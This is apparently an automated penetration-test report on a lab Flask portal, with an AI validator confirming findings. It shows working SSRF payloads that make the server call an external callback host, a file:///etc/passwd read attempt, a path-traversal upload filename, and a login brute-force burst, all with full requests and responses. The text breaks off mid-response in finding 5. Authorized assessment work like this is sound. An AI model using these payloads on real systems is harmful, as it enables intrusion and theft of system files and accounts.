# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — ssrf Server-Side Request Forgery via profile_picture_url](#finding-1)
    - [2. MEDIUM — rate-limit No rate limiting or account lockout on login (brute-force / credential-stuffing exposure)](#finding-2)
    - [3. LOW — info-disclosure Username enumeration via registration response differential](#finding-3)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [4. MEDIUM — path-traversal Possible local file read/write via profile_picture_url (file://) and upload filename traversal](#finding-4)
    - [5. MEDIUM — vulnerable-component Outdated component: Python 3.8.20 (End-of-Life branch, no further security patches)](#finding-5)
    - [6. LOW — rate-limit No rate limiting on account registration (/register)](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0j5tm2-c5w7ow` |
| Target | http://target.local:32803/ |
| Started | 2026-06-30T10:55:17.825Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 4 scanned · 1 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32803`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 1 medium, 1 low

_Plus 3 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [ssrf] Server-Side Request Forgery via profile_picture_url

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

The POST /profile update accepts a `profile_picture_url` field which the server fetches server-side (no allow-list / scheme or host validation). Supplying an attacker-controlled URL causes the application server to issue an outbound request to it. Confirmed via Burp Collaborator: the target made DNS (x2) and HTTP callbacks to a unique attacker host. An attacker can pivot to internal-only services (e.g. http://169.254.169.254/ cloud metadata, http://127.0.0.1/ loopback admin panels, internal hostnames) reachable from the server. Note: the request must be sent with Content-Type: application/x-www-form-urlencoded (or multipart) so Flask parses request.form; otherwise the field is ignored.

**Reproduction**

```
1. Log in (role: test). 2. POST /profile with header Content-Type: application/x-www-form-urlencoded and body `first_name=Alice&last_name=Tester&email=alice@example.com&profile_picture_url=http://<COLLAB-HOST>/`. 3. Observe the server issues DNS+HTTP requests to <COLLAB-HOST> (evidence: 3 callbacks recorded). Negative control (benign in-scope value) produced no callback.
```

**Evidence**

- Evidence `ev-mr0k4ulh-22` — `artifacts/s-0003/ev-mr0k4ulh-22/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

first_name=Alice&last_name=Tester&email=alice@example.com&profile_picture_url=http://verdict-oob-noref-n7vzkdy0.invalid/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3291
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:22:31 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

[VERDICT-OOB] control: benign host, no callback expected
```

- Evidence `ev-mr0k4z8h-24` — `artifacts/s-0003/ev-mr0k4z8h-24/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

first_name=Alice&last_name=Tester&email=alice@example.com&profile_picture_url=http://n7vzkdy0en5gvmyn6sy9ufkzbqhji77.oastify.com/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3291
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:22:37 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=n7vzkdy0en5gvmyn6sy9ufkzbqhji77.oastify.com payload_id=n7vzkdy0en5gvmyn6sy9ufkzbqhji77 interactions=[DNS@2026-06-30T11:22:32.182Z from 106.187.11.38; DNS@2026-06-30T11:22:32.184Z from 106.187.11.38; HTTP@2026-06-30T11:22:32.726Z from 27.83.152.211] [read#1]
```

- Evidence `ev-mr0k4zvw-25` — `artifacts/s-0003/ev-mr0k4zvw-25/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

first_name=Alice&last_name=Tester&email=alice@example.com&profile_picture_url=http://n7vzkdy0en5gvmyn6sy9ufkzbqhji77.oastify.com/
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3291
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:22:38 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=n7vzkdy0en5gvmyn6sy9ufkzbqhji77.oastify.com payload_id=n7vzkdy0en5gvmyn6sy9ufkzbqhji77 interactions=[DNS@2026-06-30T11:22:32.182Z from 106.187.11.38; DNS@2026-06-30T11:22:32.184Z from 106.187.11.38; HTTP@2026-06-30T11:22:32.726Z from 27.83.152.211] [read#2]
```

<a id="finding-2"></a>

### 2. [MEDIUM] [rate-limit] No rate limiting or account lockout on login (brute-force / credential-stuffing exposure)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

The POST /login endpoint applies no rate limiting, throttling, CAPTCHA, or account-lockout. 10 consecutive failed authentication attempts against a valid account (verdict_t1) were each processed normally (HTTP 200, identical failed-login body, no Retry-After, no 429, no progressive delay), and immediately afterward the correct credentials still authenticated successfully (HTTP 302 -> /profile), proving the account was never locked. This allows unlimited online password guessing and credential-stuffing against any account. Username/account identifiers are easy to obtain via self-registration, amplifying the risk.

**Reproduction**

```
1. Register/know a valid account (verdict_t1 / Passw0rd!123).
2. Send 10 rapid POST /login requests with body username=verdict_t1&password=brute1..brute10 (wrong passwords). Every response is HTTP 200 with the standard failed-login page (bodyLength 2856) — no 429, no lockout, no delay [positiveReplays ev-mr0jdj1e-j, ev-mr0jdk42-k, ev-mr0jdmoj-m].
3. Immediately POST the CORRECT credentials username=verdict_t1&password=Passw0rd!123 -> HTTP 302 redirect to /profile with a valid session cookie [negativeControl ev-mr0je3xw-t], confirming the account is NOT locked after the failed burst.
Result: the login endpoint can be brute-forced indefinitely with no mitigation.
```

**Evidence**

- Evidence `ev-mr0je3xw-t` — `artifacts/s-0001/ev-mr0je3xw-t/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_t1&password=Passw0rd!123
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 203
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:01:44 GMT
location: /profile
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/profile">/profile</a>. If not, click the link.
```

- Evidence `ev-mr0jdj1e-j` — `artifacts/s-0001/ev-mr0jdj1e-j/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_t1&password=brute1
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2856
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:01:17 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
    </header>
    <main>
        
            
                <ul>
                    
                        <li>Invalid username or password!</li>
                    
                </ul>
            
        
        
<h2>Login</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
<div class="register-link">
    <p>Don't have an account? <a href="/register">Register here</a></p>
</div>

    </main>
</body>
</html>
```

- Evidence `ev-mr0jdk42-k` — `artifacts/s-0001/ev-mr0jdk42-k/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_t1&password=brute2
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2856
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:01:18 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
    </header>
    <main>
        
            
                <ul>
                    
                        <li>Invalid username or password!</li>
                    
                </ul>
            
        
        
<h2>Login</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
<div class="register-link">
    <p>Don't have an account? <a href="/register">Register here</a></p>
</div>

    </main>
</body>
</html>
```

- Evidence `ev-mr0jdmoj-m` — `artifacts/s-0001/ev-mr0jdmoj-m/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_t1&password=brute4
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2856
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:01:21 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
    </header>
    <main>
        
            
                <ul>
                    
                        <li>Invalid username or password!</li>
                    
                </ul>
            
        
        
<h2>Login</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>
<div class="register-link">
    <p>Don't have an account? <a href="/register">Register here</a></p>
</div>

    </main>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [info-disclosure] Username enumeration via registration response differential

- Screen: `s-0004`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

The POST /register endpoint discloses whether a username is already registered through a distinguishable response. Registering an AVAILABLE username returns 302 redirect to /login (flash "Registration successful! Please login.", 199-byte body). Registering an EXISTING username returns 200 re-rendering the full registration page (3030-byte body with an error). The two responses differ only as a function of whether the supplied username already exists, letting an unauthenticated attacker enumerate valid usernames. Impact is amplified because /register has no rate limiting (already confirmed: rate-limit::/register), so an attacker can harvest the full valid-username list at speed and feed it into credential-stuffing/spray attacks. Confirmed with a controlled differential where only the username varied: baseline (fresh username) = 302/199, marker absent; two replays (existing username verdict_u2) = 200/3030, marker present.

**Reproduction**

```
1. POST /register (form-encoded) with a never-used username and valid other fields -> HTTP 302, Location: /login, body "Redirecting..." (199 bytes). 2. POST /register with an already-registered username (e.g. verdict_u2) and otherwise-valid fields -> HTTP 200, full registration page re-rendered (3030 bytes, contains "Synthwave User Portal"). 3. The 302-vs-200 (199-byte redirect vs 3030-byte page re-render) reliably reveals whether any given username exists. Negative control ev-mr0ksvfk-36 (fresh username -> 302, marker absent) vs positive replays ev-mr0ksvop-37 / ev-mr0ksvwj-38 (existing username -> 200, marker "Synthwave User Portal" present, stable).
```

**Evidence**

- Evidence `ev-mr0ksvfk-36` — `artifacts/s-0004/ev-mr0ksvfk-36/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_plbase1&password=Passw0rd!xy&first_name=F&last_name=L&email=plbase1@example.com
```

Response:

```http
HTTP/1.1 302
connection: close
content-length: 199
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:41:12 GMT
location: /login
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
```

- Evidence `ev-mr0ksvop-37` — `artifacts/s-0004/ev-mr0ksvop-37/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_u2&password=Passw0rd!xy&first_name=F&last_name=L&email=u2dup@example.com
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3030
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:41:12 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
    </header>
    <main>
        
            
                <ul>
                    
                        <li>Username already exists!</li>
                    
                </ul>
            
        
        
<h2>Register</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <label for="first_name">First Name:</label>
    <input type="text" name="first_name" required>
    <label for="last_name">Last Name:</label>
    <input type="text" name="last_name" required>
    <label for="email">Email:</label>
    <input type="email" name="email" required>
    <button type="submit">Register</button>
</form>

    </main>
</body>
</html>
```

- Evidence `ev-mr0ksvwj-38` — `artifacts/s-0004/ev-mr0ksvwj-38/`

Request:

```http
POST /register HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=verdict_u2&password=Passw0rd!xy&first_name=F&last_name=L&email=u2dup@example.com
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3030
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:41:13 GMT
server: Werkzeug/3.0.6 Python/3.8.20
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
    </header>
    <main>
        
            
                <ul>
                    
                        <li>Username already exists!</li>
                    
                </ul>
            
        
        
<h2>Register</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
    <label for="password">Password:</label>
    <input type="password" name="password" required>
    <label for="first_name">First Name:</label>
    <input type="text" name="first_name" required>
    <label for="last_name">Last Name:</label>
    <input type="text" name="last_name" required>
    <label for="email">Email:</label>
    <input type="email" name="email" required>
    <button type="submit">Register</button>
</form>

    </main>
</body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-4"></a>

### 4. [SUSPECTED] [MEDIUM] [path-traversal] Possible local file read/write via profile_picture_url (file://) and upload filename traversal

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

**Anomaly (why this is a lead):** profile_picture_url=file:///etc/passwd returned 200 and the server rendered the raw file:// URL into an <img src> (page +~100 bytes) without rejecting the scheme; the multipart upload also accepted a ../../../../tmp/ traversal filename with a 200 and no error — a genuine LFI/arbitrary-write lead I could not confirm without a read-back/serving path.

The confirmed SSRF sink (profile_picture_url) appears to accept the file:// scheme, and the profile_picture multipart upload accepts attacker-controlled filenames. This is a plausible local-file read (file://) / write (traversal filename) primitive, but it could not be fully confirmed this run because no storage/serving path was found to retrieve the fetched/uploaded content for read-back, and the impact scanner did not detect /etc/passwd content in the response.

**Reproduction**

```
1. Log in (role: test). 2. POST /profile (Content-Type: application/x-www-form-urlencoded) body `...&profile_picture_url=file:///etc/passwd` → 200, response grew ~100 bytes (URL rendered into <img src="file:///etc/passwd">), no error. 3. POST /profile (multipart) with profile_picture filename `../../../../tmp/verdict_pt12345.txt` → 200, no sanitization error. Read-back of stored content not achievable without knowing the upload/serving directory. Manual verification: check server filesystem / locate the profile-picture serving endpoint to confirm whether file:// content is saved/served and whether the traversal filename escapes the upload dir.
```

**Evidence**

- Evidence `ev-mr0k9wez-2g` — `artifacts/s-0003/ev-mr0k9wez-2g/`

Request:

```http
POST /profile HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

first_name=Alice&last_name=Tester&email=a@a.com&profile_picture_url=file%3A%2F%2F%2Fetc%2Fpasswd
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 3218
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:26:27 GMT
server: Werkzeug/3.0.6 Python/3.8.20
vary: Cookie

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
            <nav>
                <a href="/profile">Profile</a>
                <a href="/logout">Logout</a>
            </nav>
        
    </header>
    <main>
        
            
        
        
<h2>Profile</h2>
<form method="post" enctype="multipart/form-data">
    <label for="first_name">First Name:</label>
    <input type="text" name="first_name" value="Alice" required>
    <label for="last_name">Last Name:</label>
    <input type="text" name="last_name" value="Tester" required>
    <label for="email">Email:</label>
    <input type="email" name="email" value="a@a.com" required>
    <label for="profile_picture">Profile Picture:</label>
    <input type="file" name="profile_picture">
    <label for="profile_picture_url">Or Profile Picture URL:</label>
    <input type="url" name="profile_picture_url">
    <button type="submit">Save</button>
</form>

    <h3>Current Profile Picture:</h3>
    <img src="/static/uploads/passwd" alt="Profile Picture">



    </main>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [SUSPECTED] [MEDIUM] [vulnerable-component] Outdated component: Python 3.8.20 (End-of-Life branch, no further security patches)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32803/

**Anomaly (why this is a lead):** Python 3.8.20 detected via the Server response header (`Werkzeug/3.0.6 Python/3.8.20`) on every page. Python 3.8 reached End-of-Life on 2024-10-07 and 3.8.20 is the final release of that branch — it will receive NO further security fixes, so any future CPython/standard-library CVE remains permanently unpatched on this host. This is a version/EOL-based lead, not an actively exploited flaw; no specific unpatched CVE was weaponized here.

The application discloses its runtime via the `Server: Werkzeug/3.0.6 Python/3.8.20` header. Python 3.8 is End-of-Life as of 2024-10-07 (PEP 569); 3.8.20 (Sept 2024) is the last release of the 3.8 series. Running an EOL interpreter means no security patches are issued going forward — future vulnerabilities in CPython or the bundled standard library (e.g. ssl, http, tarfile, zipfile, urllib classes that have historically received CVEs) will not be backported, leaving the host with no upgrade path short of moving to a supported branch (3.9+ / current 3.12–3.13). Severity medium: this is an unpatched-going-forward exposure rather than a presently-demonstrated RCE. Remediation: upgrade to a supported Python branch. (Separately note: the `Server` banner itself leaks exact runtime versions, and the Werkzeug 3.0.6 banner indicates the built-in development server — not intended for production — but those are misconfiguration/header-disclosure concerns outside this A06 component-version finding. Werkzeug 3.0.6 itself is patched against CVE-2024-49766/49767 and is not recorded as outdated.)

**Reproduction**

```
1. Send any request, e.g. `GET http://target.local:32803/login`.
2. Inspect the response headers: `Server: Werkzeug/3.0.6 Python/3.8.20`.
3. Cross-reference Python 3.8 against the CPython release calendar: branch reached End-of-Life 2024-10-07; 3.8.20 is the final release. No security updates are produced for this branch thereafter.
```

**Evidence**

- Evidence `ev-mr0l2dn9-3r` — `artifacts/_/ev-mr0l2dn9-3r/`

Request:

```http
GET /login HTTP/1.1
Host: target.local:32803
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
connection: close
content-length: 2833
content-type: text/html; charset=utf-8
date: Tue, 30 Jun 2026 11:48:36 GMT
server: Werkzeug/3.0.6 Python/3.8.20

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Synthwave User Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <!--
        Flask Application Endpoints Documentation

        1. `/`
           Method: GET
           Description: Redirects to the profile page if logged in, otherwise to the login page.

        2. `/register`
           Method: GET, POST
           Description: Displays the registration form and handles user registration.
           Parameters (POST):
           - `username`: The desired username of the user.
           - `password`: The desired password of the user.
           - `first_name`: The first name of the user.
           - `last_name`: The last name of the user.
           - `email`: The email address of the user.

        3. `/login`
           Method: GET, POST
           Description: Displays the login form and handles user login.
           Parameters (POST):
           - `username`: The username of the user.
           - `password`: The password of the user.

        4. `/logout`
           Method: GET
           Description: Logs out the current user and redirects to the login page.

        5. `/profile`
           Method: GET, POST
           Description: Displays the profile page of the logged-in user and handles profile updates.
           Parameters (POST):
           - `first_name`: The updated first name of the user.
           - `last_name`: The updated last name of the user.
           - `email`: The updated email address of the user.
           - `profile_picture`: The new profile picture of the user (file upload).
           - `profile_picture_url`: The URL to fetch a new profile picture.

        6. `/reset_password`
           Method: GET
           Description: Resets the password for a user. Only accessible from localhost.
           Parameters (GET):
           - `username`: The username of the user whose password is to be reset.
           - `newpassword`: The new password for the user.
    -->

    <header>
        <h1>Synthwave User Portal</h1>
        
            <nav>
                <a href="/profile">Profile</a>
                <a href="/logout">Logout</a>
            </nav>
        
    </header>
    <main>
        
            
        
        
<h2>Login</h2>
<form method="post">
    <label for="username">Username:</label>
    <input type="text" name="username" required>
